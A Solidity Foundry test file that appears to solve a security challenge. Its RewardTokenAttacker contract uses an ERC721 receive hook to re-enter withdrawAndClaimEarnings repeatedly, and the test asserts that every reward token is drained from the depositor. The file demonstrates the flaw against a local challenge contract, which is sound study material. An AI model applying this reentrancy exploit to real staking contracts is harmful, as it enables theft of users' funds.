// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {RewardToken, NftToStake, Depositoor, IERC721Receiver, IERC20} from "../src/RewardToken.sol";

pragma solidity ^0.8.0;

contract RewardTokenTest is Test {
    RewardToken rewardToken;
    RewardTokenAttacker rewardTokenAttacker;
    NftToStake nftToStake;
    Depositoor depositoor;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        rewardTokenAttacker = new RewardTokenAttacker();
        nftToStake = new NftToStake(address(rewardTokenAttacker));
        depositoor = new Depositoor(nftToStake);
        rewardToken = new RewardToken(address(depositoor));
        depositoor.setRewardToken(rewardToken);
        vm.stopPrank();

        vm.deal(attacker, 1 ether);
    }

    function testRewardToken() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.startPrank(attacker);
        rewardTokenAttacker.stake(address(nftToStake), address(depositoor), address(rewardToken));

        // skip 2 hours (the more you skip, the less times you reenter the loop, thus you spent less gas)
        vm.warp(2 hours);

        rewardTokenAttacker.hack();
        vm.stopPrank();

        assertEq(rewardToken.balanceOf(address(rewardTokenAttacker)), 100e18);
        assertEq(rewardToken.balanceOf(address(depositoor)), 0);
        assert(vm.getNonce(attacker) < currentNonce + 3);
    }
}

contract RewardTokenAttacker is IERC721Receiver {
    NftToStake public nftToStake;
    Depositoor public depositoor;
    IERC20 public rewardToken;

    function stake(address _nftToStake, address _depositoor, address _rewardToken) public {
        rewardToken = IERC20(_rewardToken);
        depositoor = Depositoor(_depositoor);
        nftToStake = NftToStake(_nftToStake);
        nftToStake.safeTransferFrom(address(this), _depositoor, 42);
    }

    function hack() public {
        depositoor.withdrawAndClaimEarnings(42);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        if (rewardToken.balanceOf(address(depositoor)) > 0) {
            nftToStake.transferFrom(address(this), address(depositoor), 42);
            depositoor.withdrawAndClaimEarnings(42);
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
